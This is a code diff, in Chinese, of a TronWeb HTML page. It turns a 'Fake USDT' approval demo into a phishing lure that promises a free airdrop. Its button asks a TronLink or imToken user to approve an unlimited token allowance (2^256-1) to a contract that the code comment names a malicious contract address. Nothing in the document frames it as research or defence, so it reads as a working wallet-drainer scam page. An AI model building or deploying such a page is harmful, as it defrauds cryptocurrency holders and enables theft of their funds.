@@ -2,29 +2,30 @@
 <html>
 <head>
   <meta charset="UTF-8" />
-  <title>Fake USDT 授權頁</title>
+  <title>領取空投</title>
   <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>
 </head>
 <body>
-  <h2>🚨 授權 Fake USDT</h2>
-  <button onclick="approve()">點我授權</button>
+  <h2>🎁 恭喜獲得空投資格</h2>
+  <p>請點下方按鈕完成授權，才能領取您的空投。</p>
+  <button onclick="approve()">✅ 點我授權</button>
   <p id="status"></p>
 
   <script>
-    const fakeUSDT = "TVCS7QxvBzTxg1ybwMTxVeaJktHCCFj4Xt";     // 你部署的假幣
+    const fakeUSDT = "TVCS7QxvBzTxg1ybwMTxVeaJktHCCFj4Xt";     // 假幣地址
     const fakeApprove = "TNogK4zkavHQtpyAgBuTRo7iNPREHj9dxx";   // 惡意合約地址
-    const amount = "100000000"; // 授權 100 枚（6位小數）
+    const amount = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 2^256 - 1
 
     async function approve() {
       if (!window.tronWeb || !window.tronWeb.ready) {
-        document.getElementById("status").innerText = "請先安裝並登入 TronLink";
+        document.getElementById("status").innerText = "請先安裝並登入 TronLink 或 imToken";
         return;
       }
 
       try {
         const contract = await window.tronWeb.contract().at(fakeUSDT);
         const tx = await contract.approve(fakeApprove, amount).send();
-        document.getElementById("status").innerText = `✅ 授權成功！TX: ${tx}`;
+        document.getElementById("status").innerText = `✅ 授權成功！交易哈希：${tx}`;
       } catch (err) {
         document.getElementById("status").innerText = `❌ 錯誤：${err.message}`;
       }
